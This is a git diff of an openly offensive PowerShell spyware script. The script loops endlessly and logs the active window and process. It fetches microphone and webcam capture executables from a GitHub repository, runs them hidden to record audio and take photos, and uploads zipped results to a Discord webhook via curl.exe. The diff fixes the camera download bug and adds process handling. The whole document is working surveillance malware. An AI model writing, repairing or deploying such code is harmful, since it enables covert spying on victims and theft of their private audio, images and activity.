@@ -1,7 +1,5 @@
 $Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
 $BaseDir = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_data"
-$mic_path = $null
-$cam_path = $null
 $Counter = 0
 
 # Create spy dir
@@ -24,6 +22,8 @@ function Get-Paths {
 }
 
 $dropPaths = Get-Paths
+$mic_path = $dropPaths | Get-Random
+$cam_path = $dropPaths | Get-Random
 
 function Get-Tool {
     param(
@@ -41,8 +41,6 @@ function Get-Tool {
 }
 
 while ($true) {
-
-    $Counter++
     $time = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
     $activeWindow = (Get-Process | Where-Object {$_.MainWindowTitle} | Sort-Object CPU -Descending | Select-Object -First 1).MainWindowTitle
     $foregroundProc = (Get-Process | Where-Object {$_.Id -eq (Get-Process -Id (Get-NetTCPConnection -State Established | Where-Object {$_.OwningProcess} | Select-Object -First 1).OwningProcess)}).Name
@@ -84,24 +82,39 @@ while ($true) {
             $mic_path = $dropPaths | Get-Random
             $randomFileName = [System.IO.Path]::GetRandomFileName()
             $mic_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/micrecorder.exe" -name $randomFileName -path $mic_path
+            Write-Output "mic path: $mic_path"
         }
         if( -not( Test-Path -Path "$cam_path" -PathType Leaf ) ){
             $cam_path = $dropPaths | Get-Random
             $randomFileName = [System.IO.Path]::GetRandomFileName()
-            $cam_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/micrecorder.exe" -name $randomFileName -path $cam_path
+            $cam_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/cam_cap.exe" -name $randomFileName -path $cam_path
+            Write-Output "cam path: $cam_path"
         }
         $params = @("-o", "$BaseDir\mic.wav", "-d", "10")
-        Start-Process $mic_path -WindowStyle Hidden -ArgumentList $params
-
-        # Start-Process $mic_path -WindowStyle Hidden -ArgumentList "-o `"$BaseDir\mic.wav`" -d 10"
-        
         $params2 = @("-o", "$BaseDir\cam.jpg")
+        
+        # Start-Process $mic_path -WindowStyle Hidden -ArgumentList "-o `"$BaseDir\mic.wav`" -d 10"
         # Start-Process $cam_path -WindowStyle Hidden -ArgumentList "-o `"$BaseDir\cam.jpg`""
-        Start-Process $cam_path -WindowStyle Hidden -ArgumentList $params2
+        
+        $micProc = Start-Process $mic_path -WindowStyle Hidden -ArgumentList $params -PassThru
+        $camProc = Start-Process $cam_path -WindowStyle Hidden -ArgumentList $params2 -PassThru
         
     }
 
     if( $Counter % 240 -eq 0 ) {
+        if(-not($micProc.HasExited)) {
+            $micDone = $micProc.WaitForExit(10000)
+            if(-not($micDone)){
+                $micProc.Kill()
+            }
+        }
+        if(-not($camProc.HasExited)) { 
+            $camDone = $camProc.WaitForExit(10000)
+            if(-not($camDone)){
+                $camProc.Kill()
+            }
+         }
+        
         $zip = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_$(Get-Date -f 'yyyy_MM_dd_HH_mm_ss').zip"
         Compress-Archive -Path "$BaseDir\*" -DestinationPath $zip -Force
         curl.exe -F "file=@$zip" $Webhook
@@ -109,6 +122,6 @@ while ($true) {
         Remove-Item $zip -Force
         $Counter = 0
     }
-    
     Start-Sleep -Seconds 15
+    $Counter++
 }
